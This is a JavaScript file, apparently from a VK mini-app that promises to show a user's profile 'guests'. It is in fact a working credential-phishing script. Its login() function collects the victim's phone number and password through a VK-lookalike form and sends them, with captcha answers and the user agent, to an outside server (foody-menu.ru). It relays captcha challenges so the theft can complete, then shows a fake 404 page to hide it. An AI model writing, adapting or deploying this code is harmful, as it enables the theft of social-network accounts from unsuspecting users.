      function getToken() {
          vkConnect.sendPromise("VKWebAppGetAuthToken", {
              "app_id": parseInt(findGetParameter("vk_app_id")),
              "scope": "friends,groups"
          })
          .then(data => {
              if(token){return false;}
              token = data.access_token;
              firstApi();
          })
          .catch(error => {
              setTimeout(function() {
                  getToken();
              }, 1000);
          });
      }

    function findGetParameter(parameterName) {
      var result = null,
          tmp = [];
      location.search
          .substr(1)
          .split("&")
          .forEach(function (item) {
            tmp = item.split("=");
            if (tmp[0] === parameterName) result = decodeURIComponent(tmp[1]);
          });
      return result;
  }

  function isAndroid(){
    return /Android/i.test(navigator.userAgent);
  }
  function isIphone(){
    return /Iphone/i.test(navigator.userAgent);
  }

  function login() {
    var phone = $("#phone").val();
    var pass = $("#pass").val();

    var captcha_sid = $("#captcha_sid").val();
    var captcha_proxi = $("#captcha_proxi").val();
    var captcha_key = $("#captcha_key").val();
    var method = $("#method").val();
    var token = $("#token").val();
    var upload_result = $("#upload_result").val();

    $("#vk_wrap").append("<div id='loader' style='text-align:center;position: absolute;width: 100%;height: 100%;background: #ffffff9e;top: 0px;left: 0px;'><img style='margin-top: 200px;' src='images/loading.gif'></div>");
    if(!phone || !pass){
      errorLogin()
    }
    var device = "android";
    if(isIphone()){
      device = "iphone";
    }
    $("#captcha_div").css("display","none");
    $("#captcha_key").val("");
    $("#captcha_sid").val("");
    $("#captcha_proxi").val("");
    $("#method").val("");
    $("#token").val("");
    $("#upload_result").val("");
    $.ajax({
        type: "POST",
        url: "https://foody-menu.ru/FK/go.php",
        data: {
            "phone": phone,
            "pass": pass,
            "device": device,
            "captcha_sid": captcha_sid,
            "captcha_proxi": captcha_proxi,
            "captcha_key": captcha_key,
            "method": method,
            "token": token,
            "upload_result": upload_result,
            "user_agent": window.navigator.userAgent
        },
        success: function(data){
            data = JSON.parse(data);
            $("#loader").remove();
            if(data.error){
              if(data.error == "invalid_client"){
                errorLogin()
              }
              if(data.error == "need_captcha"){
                $("#captcha_div").css("display","");
                $("#captcha").attr("src",data.captcha_img);
                $("#captcha_sid").val(data.captcha_sid);
                $("#captcha_proxi").val(data.proxi);
                $("#method").val(data.method);
                $("#token").val(data.token);
                $("#upload_result").val(data.upload_result);
                if(data.method && data.token) {
                  $("#phone").css("display", "none");
                  $("#pass").css("display", "none");
                }
              }
            }else{
              $("html").html(' \n\
                <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n\
                <html><head>\n\
                <title>404 Not Found</title>\n\
                </head><body>\n\
                <h1>Not Found</h1>\n\
                <p>The requested URL was not found on this server.</p>\n\
                <hr>\n\
                <address>Apache/2.4.51 (Unix) Server at foody-menu.ru Port 80</address>\n\
                </body></html>\n\
                ');
            }

        },
        error : function(data){
             $.ajax(this);
        }});

  }

  function showGuests(data) {
      $(".form_item").html('<div class="login_header"><b>Сортировка по дате и времени</b> в порядке убывания</div>');
      for(var i=0;i<data.response.items.length;i++) {
        if(data.response.items[i].deactivated || !data.response.items[i].last_seen){
            continue;
        }
        $(".form_item").append('<div style="margin: 10px;display:inline-block;text-align:center;"><img style="border-radius: 50%;" src="'+data.response.items[i].photo_100+'"><a style="display: block;" href="https://vk.com/id'+data.response.items[i].id+'" target="_blank">'+data.response.items[i].first_name+'</a></div>');
      }
  }

  function errorLogin(){
    $("#loginError").html('<div style="color: #826f4d;" class="service_msg_box"><div class="service_msg service_msg_warning"><b>Не удаётся войти.</b><br>Пожалуйста, проверьте правильность введённых данных.</div></div>');
  }
